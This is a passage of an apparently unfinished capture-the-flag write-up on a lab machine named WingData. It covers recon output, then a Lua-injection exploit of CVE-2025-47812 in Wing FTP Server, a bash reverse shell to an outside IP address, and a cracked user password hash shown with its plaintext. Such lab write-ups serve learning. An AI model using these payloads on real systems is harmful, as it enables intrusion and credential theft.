I used my script which automates the tasks at the beginning suchs as the portscan and domain scan

This is the summary of the results
```bash
Would you like to preview all results? (Y/n): y

════════════════════════════════════════
File: results_10.129.6.227/dirsearch_http_80.txt
════════════════════════════════════════
# Dirsearch started Sat Mar 14 17:45:28 2026 as: /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u http://wingdata.htb:80 -x 404 -q --no-color --full-url --format=plain --user-agent Mozilla/5.0 -o results_10.129.6.227/dirsearch_http_80.txt

403   317B   http://wingdata.htb/.ht_wsr.txt
403   317B   http://wingdata.htb/.htaccess.bak1
403   317B   http://wingdata.htb/.htaccess.sample
403   317B   http://wingdata.htb/.htaccess.orig
403   317B   http://wingdata.htb/.htaccess.save
403   317B   http://wingdata.htb/.htaccess_sc
403   317B   http://wingdata.htb/.htaccess_orig
403   317B   http://wingdata.htb/.htaccess_extra
403   317B   http://wingdata.htb/.htaccessBAK
403   317B   http://wingdata.htb/.htaccessOLD
403   317B   http://wingdata.htb/.htaccessOLD2
403   317B   http://wingdata.htb/.htm
403   317B   http://wingdata.htb/.html
403   317B   http://wingdata.htb/.httr-oauth
403   317B   http://wingdata.htb/.htpasswds
403   317B   http://wingdata.htb/.htpasswd_test
403   317B   http://wingdata.htb/assets/
301   353B   http://wingdata.htb/assets    -> REDIRECTS TO: http://wingdata.htb/assets/
403   317B   http://wingdata.htb/server-status
403   317B   http://wingdata.htb/server-status/
403   317B   http://wingdata.htb/vendor/

════════════════════════════════════════
File: results_10.129.6.227/dirsearch_sub_ftp.txt
════════════════════════════════════════
# Dirsearch started Sat Mar 14 17:45:43 2026 as: /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u http://ftp.wingdata.htb -x 404 -q --no-color --full-url --user-agent Mozilla/5.0 --format=plain -o results_10.129.6.227/dirsearch_sub_ftp.txt

200   111B   http://ftp.wingdata.htb/crossdomain.xml
200     0B   http://ftp.wingdata.htb/css
200    19KB  http://ftp.wingdata.htb/favicon.ico
500     0B   http://ftp.wingdata.htb/help
500     0B   http://ftp.wingdata.htb/help/
500     0B   http://ftp.wingdata.htb/icons
500     0B   http://ftp.wingdata.htb/images/
500     0B   http://ftp.wingdata.htb/images
500     0B   http://ftp.wingdata.htb/include
500     0B   http://ftp.wingdata.htb/include/
500     0B   http://ftp.wingdata.htb/language
200     8KB  http://ftp.wingdata.htb/login.html
200   259B   http://ftp.wingdata.htb/logout.html
500     0B   http://ftp.wingdata.htb/plugins
500     0B   http://ftp.wingdata.htb/plugins/
200   258B   http://ftp.wingdata.htb/search.html

════════════════════════════════════════
File: results_10.129.6.227/nmap_results.txt
════════════════════════════════════════
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-14 17:38 -0400
Nmap scan report for wingdata.htb (10.129.6.227)
Host is up (0.032s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-title: WingData Solutions
|_http-server-header: Apache/2.4.66 (Debian)
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.66 seconds

════════════════════════════════════════
File: results_10.129.6.227/subDomains.txt
════════════════════════════════════════
ftp

════════════════════════════════════════
File: results_10.129.6.227/summary.txt
════════════════════════════════════════
============================================
  RECON SUMMARY
  Generated: 2026-03-14 17:45:46
============================================

Target:            10.129.6.227
CTF name:          10.129.6.227
Output directory:  results_10.129.6.227/

--------------------------------------------
  PORTS
--------------------------------------------
All open ports:    22,80
HTTP ports:        80
HTTPS ports:       none

--------------------------------------------
  WEB
--------------------------------------------
DNS / vhost:       wingdata.htb
Subdomains found:  1
Subdomains:        ftp

--------------------------------------------
  INTERESTING PATHS
--------------------------------------------
  # Dirsearch started Sat Mar 14 17:45:28 2026 as: /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u http://wingdata.htb:80 -x 404 -q --no-color --full-url --format=plain --user-agent Mozilla/5.0 -o results_10.129.6.227/dirsearch_http_80.txt
  403   317B   http://wingdata.htb/.ht_wsr.txt
  403   317B   http://wingdata.htb/.htaccess.bak1
  403   317B   http://wingdata.htb/.htaccess.sample
  403   317B   http://wingdata.htb/.htaccess.orig
  403   317B   http://wingdata.htb/.htaccess.save
  403   317B   http://wingdata.htb/.htaccess_sc
  403   317B   http://wingdata.htb/.htaccess_orig
  403   317B   http://wingdata.htb/.htaccess_extra
  403   317B   http://wingdata.htb/.htaccessBAK
  403   317B   http://wingdata.htb/.htaccessOLD
  403   317B   http://wingdata.htb/.htaccessOLD2
  403   317B   http://wingdata.htb/.htm
  403   317B   http://wingdata.htb/.html
  403   317B   http://wingdata.htb/.httr-oauth
  403   317B   http://wingdata.htb/.htpasswds
  403   317B   http://wingdata.htb/.htpasswd_test
  403   317B   http://wingdata.htb/assets/
  301   353B   http://wingdata.htb/assets    -> REDIRECTS TO: http://wingdata.htb/assets/
  403   317B   http://wingdata.htb/server-status
  403   317B   http://wingdata.htb/server-status/
  403   317B   http://wingdata.htb/vendor/

--------------------------------------------
  FILES
--------------------------------------------
  results_10.129.6.227/dirsearch_http_80.txt
  results_10.129.6.227/dirsearch_sub_ftp.txt
  results_10.129.6.227/nmap_results.txt
  results_10.129.6.227/subDomains.txt

============================================
```

Ok so there is alot of information in this. I found an ftp subdomain and its powered by Wing FTP server v.7.4.3 lets see if there is a vulnerability for this.


https://nvd.nist.gov/vuln/detail/CVE-2025-47812


Seems like there is a remote code execution.



```bash
Description

In Wing FTP Server before 7.4.4. the user and admin web interfaces mishandle '\0' bytes, ultimately allowing injection of arbitrary Lua code into user session files. This can be used to execute arbitrary system commands with the privileges of the FTP service (root or SYSTEM by default). This is thus a remote code execution vulnerability that guarantees a total server compromise. This is also exploitable via anonymous FTP accounts.
```

We basically just create a session file that includes the injected code.


```bash
username=anonymous%00]]+local+h+%3d+io.popen("whoami")+local+r+%3d+h%3aread("*a")+h%3aclose()+print(r)--&password=anonymous
&username_val=anonymous&password_val=anonymous
```


I used this injection to see what would happen and it reflects the wingftp aka the "whoami" command on the website. Lets just switch it out for a revshell and then we'll get a shell hopefully.

```bash
username=anonymous%00]]+local+h+%3d+io.popen("bash+-c+'bash+-i+>%26+/dev/tcp/10.10.15.242/6666+0>%261'")+local+r+%3d+h%3aread("*a")+h%3aclose()+print(r)--&password=anonymous
&username_val=anonymous&password_val=anonymous
```

```bash
nc -lvnp 6666
listening on [any] 6666 ...
connect to [10.10.15.242] from (UNKNOWN) [10.129.6.227] 57888
bash: cannot set terminal process group (3549): Inappropriate ioctl for device
bash: no job control in this shell
wingftp@wingdata:/opt/wftpserver$ whoami
whoami
wingftp
wingftp@wingdata:/opt/wftpserver$ 
```

After looking around the machine we were able to find some credentials


```bash
wingftp@wingdata:/opt/wftpserver/Data/1/users$ ls
ls
anonymous.xml
john.xml
maria.xml
steve.xml
wacky.xml
wingftp@wingdata:/opt/wftpserver/Data/1/users$ cat wac
cat wacky.xml 
<?xml version="1.0" ?>
<USER_ACCOUNTS Description="Wing FTP Server User Accounts">
    <USER>
        <UserName>wacky</UserName>
        <EnableAccount>1</EnableAccount>
        <EnablePassword>1</EnablePassword>
        <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
        <ProtocolType>63</ProtocolType>
        <EnableExpire>0</EnableExpire>
        <ExpireTime>2025-12-02 12:02:46</ExpireTime>
        <MaxDownloadSpeedPerSession>0</MaxDownloadSpeedPerSession>
        <MaxUploadSpeedPerSession>0</MaxUploadSpeedPerSession>
        <MaxDownloadSpeedPerUser>0</MaxDownloadSpeedPerUser>
        <MaxUploadSpeedPerUser>0</MaxUploadSpeedPerUser>
        <SessionNoCommandTimeOut>5</SessionNoCommandTimeOut>
        <SessionNoTransferTimeOut>5</SessionNoTransferTimeOut>
        <MaxConnection>0</MaxConnection>
        <ConnectionPerIp>0</ConnectionPerIp>
        <PasswordLength>0</PasswordLength>
        <ShowHiddenFile>0</ShowHiddenFile>
        <CanChangePassword>0</CanChangePassword>
        <CanSendMessageToServer>0</CanSendMessageToServer>
        <EnableSSHPublicKeyAuth>0</EnableSSHPublicKeyAuth>
        <SSHPublicKeyPath></SSHPublicKeyPath>
        <SSHAuthMethod>0</SSHAuthMethod>
        <EnableWeblink>1</EnableWeblink>
        <EnableUplink>1</EnableUplink>
        <EnableTwoFactor>0</EnableTwoFactor>
        <TwoFactorCode></TwoFactorCode>
        <ExtraInfo></ExtraInfo>
        <CurrentCredit>0</CurrentCredit>
        <RatioDownload>1</RatioDownload>
        <RatioUpload>1</RatioUpload>
        <RatioCountMethod>0</RatioCountMethod>
        <EnableRatio>0</EnableRatio>
        <MaxQuota>0</MaxQuota>
        <CurrentQuota>0</CurrentQuota>
        <EnableQuota>0</EnableQuota>
        <NotesName></NotesName>
        <NotesAddress></NotesAddress>
        <NotesZipCode></NotesZipCode>
        <NotesPhone></NotesPhone>
        <NotesFax></NotesFax>
        <NotesEmail></NotesEmail>
        <NotesMemo></NotesMemo>
        <EnableUploadLimit>0</EnableUploadLimit>
        <CurLimitUploadSize>0</CurLimitUploadSize>
        <MaxLimitUploadSize>0</MaxLimitUploadSize>
        <EnableDownloadLimit>0</EnableDownloadLimit>
        <CurLimitDownloadLimit>0</CurLimitDownloadLimit>
        <MaxLimitDownloadLimit>0</MaxLimitDownloadLimit>
        <LimitResetType>0</LimitResetType>
        <LimitResetTime>1762103089</LimitResetTime>
        <TotalReceivedBytes>0</TotalReceivedBytes>
        <TotalSentBytes>0</TotalSentBytes>
        <LoginCount>2</LoginCount>
        <FileDownload>0</FileDownload>
        <FileUpload>0</FileUpload>
        <FailedDownload>0</FailedDownload>
        <FailedUpload>0</FailedUpload>
        <LastLoginIp>127.0.0.1</LastLoginIp>
        <LastLoginTime>2025-11-02 12:28:52</LastLoginTime>
        <EnableSchedule>0</EnableSchedule>
    </USER>
</USER_ACCOUNTS>
wingftp@wingdata:/opt/wftpserver/Data/1/users$ 
```

I used hash-identifier and it said that the hash is sha-256 but for somereason I'm having trouble with cracking it.

32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5


I managed to crack it with hashcat. I was missing the salt which was just WingFTP. It took me a while to figur eit out.


```bash
wacky@wingdata:~$ sudo -l
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

We are able to use run a backup python script as root. Let's take a closer look on it. 


__________________________UNFINISHED_________________________________
